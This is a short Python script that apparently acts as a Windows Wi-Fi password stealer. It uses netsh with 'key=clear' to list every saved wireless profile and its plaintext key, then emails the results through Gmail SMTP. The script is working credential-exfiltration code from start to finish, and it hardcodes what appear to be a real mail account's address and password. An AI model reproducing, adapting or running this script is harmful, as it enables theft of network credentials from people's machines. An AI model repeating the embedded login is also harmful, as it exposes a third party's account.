import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
    result = [b.split(":")[1][1:-1] for b in results if "SSID name" in b]
    result2 = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    send_mail("akshay010696@gmail.com", "Fl@m!ng0aksh1", str(result+result2))